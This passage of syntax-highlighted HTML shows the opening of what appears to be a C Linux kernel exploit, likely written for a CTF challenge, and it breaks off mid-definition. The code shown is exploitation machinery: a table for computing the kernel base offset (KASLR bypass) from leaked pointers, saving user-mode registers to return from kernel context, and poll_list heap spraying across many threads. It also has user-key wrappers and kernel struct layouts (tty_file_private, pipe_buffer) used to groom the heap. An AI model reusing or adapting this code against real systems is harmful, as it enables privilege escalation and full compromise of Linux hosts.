class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sysinfo.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">randint</span><span class="params">(<span class="type">int</span> min, <span class="type">int</span> max)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> min + (rand() % (max - min));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">bool</span> fixed, <span class="type">bool</span> thread)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(fixed ? <span class="number">0</span> : randint(<span class="number">1</span>, get_nprocs()), &amp;cpu_set);</span><br><span class="line">    <span class="keyword">if</span> (thread) &#123;</span><br><span class="line">        pthread_setaffinity_np(pthread_self(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_kernel_text_addr</span><span class="params">(<span class="type">size_t</span> addr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> addr &gt;= <span class="number">0xFFFFFFFF80000000</span> &amp;&amp; addr &lt;= <span class="number">0xFFFFFFFFFEFFFFFF</span>;</span><br><span class="line"><span class="comment">//    return addr &gt;= 0xFFFFFFFF80000000 &amp;&amp; addr &lt;= 0xFFFFFFFF9FFFFFFF;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_dir_mapping_addr</span><span class="params">(<span class="type">size_t</span> addr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> addr &gt;= <span class="number">0xFFFF888000000000</span> &amp;&amp; addr &lt;= <span class="number">0xFFFFc87FFFFFFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INVALID_KERNEL_OFFSET 0x1145141919810</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> kernel_addr_list[] = &#123;</span><br><span class="line">        <span class="number">0xffffffff813275c0</span>,</span><br><span class="line">        <span class="number">0xffffffff812d4320</span>,</span><br><span class="line">        <span class="number">0xffffffff812d4340</span>,</span><br><span class="line">        <span class="number">0xffffffff812d4330</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">kernel_offset_query</span><span class="params">(<span class="type">size_t</span> kernel_text_leak)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_kernel_text_addr(kernel_text_leak)) &#123;</span><br><span class="line">        <span class="keyword">return</span> INVALID_KERNEL_OFFSET;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(kernel_addr_list) / <span class="keyword">sizeof</span>(kernel_addr_list[<span class="number">0</span>]); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!((kernel_text_leak ^ kernel_addr_list[i]) &amp; <span class="number">0xFFF</span>)</span><br><span class="line">            &amp;&amp; (kernel_text_leak - kernel_addr_list[i]) % <span class="number">0x100000</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> kernel_text_leak - kernel_addr_list[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] unknown kernel addr: %#lx\n&quot;</span>, kernel_text_leak);</span><br><span class="line">    <span class="keyword">return</span> INVALID_KERNEL_OFFSET;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">search_kernel_offset</span><span class="params">(<span class="type">void</span> *buf, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> *search_buf = buf;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="type">size_t</span> kernel_offset = kernel_offset_query(search_buf[i]);</span><br><span class="line">        <span class="keyword">if</span> (kernel_offset != INVALID_KERNEL_OFFSET) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel leak addr: %#lx\n&quot;</span>, search_buf[i]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %#lx\n&quot;</span>, kernel_offset);</span><br><span class="line">            <span class="keyword">return</span> kernel_offset;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> INVALID_KERNEL_OFFSET;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> nfds, timer;</span><br><span class="line">&#125; poll_args;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">entries</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">pthread_mutex_t</span> mutex = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"><span class="type">size_t</span> poll_threads, poll_cnt;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">alloc_poll_list</span><span class="params">(<span class="type">void</span> *args)</span> &#123;</span><br><span class="line">    <span class="type">int</span> nfds = ((poll_args *) args)-&gt;nfds;</span><br><span class="line">    <span class="type">int</span> timer = ((poll_args *) args)-&gt;timer;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> *<span class="title">pfds</span> =</span> <span class="built_in">calloc</span>(nfds, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pollfd));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nfds; i++) &#123;</span><br><span class="line">        pfds[i].fd = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">        pfds[i].events = POLLERR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    pthread_mutex_lock(&amp;mutex);</span><br><span class="line">    poll_threads++;</span><br><span class="line">    pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">    poll(pfds, nfds, timer);</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    pthread_mutex_lock(&amp;mutex);</span><br><span class="line">    poll_threads--;</span><br><span class="line">    pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_STACK_PPS 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POLL_NUM 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> poll_tid[POLL_NUM];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_poll_thread</span><span class="params">(<span class="type">size_t</span> size, <span class="type">int</span> timer)</span> &#123;</span><br><span class="line">    poll_args *args = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(poll_args));</span><br><span class="line">    args-&gt;nfds = </span><br><span class="line">        (size - (size + PAGE_SIZE - <span class="number">1</span>) / PAGE_SIZE * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> poll_list)) / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pollfd)</span><br><span class="line">        + N_STACK_PPS;</span><br><span class="line">    args-&gt;timer = timer;</span><br><span class="line">    pthread_create(&amp;poll_tid[poll_cnt++], <span class="number">0</span>, alloc_poll_list, args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">wait_poll_start</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (poll_threads != poll_cnt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">join_poll_threads</span><span class="params">(<span class="type">void</span> (*confuse)(<span class="type">void</span> *), <span class="type">void</span> *confuse_args)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; poll_threads; i++) &#123;</span><br><span class="line">        pthread_join(poll_tid[i], <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (confuse != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            confuse(confuse_args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    poll_cnt = poll_threads = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __aligned(x)                    __attribute__((__aligned__(x)))</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> u64;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU destructor */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> datalen;    <span class="comment">/* length of this data */</span></span><br><span class="line">    <span class="type">char</span> data[<span class="number">0</span>] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_NUM 199</span></span><br><span class="line"><span class="type">int</span> key_id[KEY_NUM];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_alloc</span><span class="params">(<span class="type">int</span> id, <span class="type">void</span> *payload, <span class="type">int</span> payload_len)</span> &#123;</span><br><span class="line">    <span class="type">char</span> description[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">    <span class="built_in">sprintf</span>(description, <span class="string">&quot;%d&quot;</span>, id);</span><br><span class="line">    <span class="keyword">return</span> key_id[id] = </span><br><span class="line">        syscall(__NR_add_key, <span class="string">&quot;user&quot;</span>, description, payload, </span><br><span class="line">                payload_len - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> user_key_payload), KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_update</span><span class="params">(<span class="type">int</span> id, <span class="type">void</span> *payload, <span class="type">size_t</span> plen)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UPDATE, key_id[id], payload, plen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_read</span><span class="params">(<span class="type">int</span> id, <span class="type">void</span> *bufer, <span class="type">size_t</span> buflen)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_READ, key_id[id], bufer, buflen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_revoke</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_REVOKE, key_id[id], <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_unlink</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UNLINK, key_id[id], KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_bufer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span 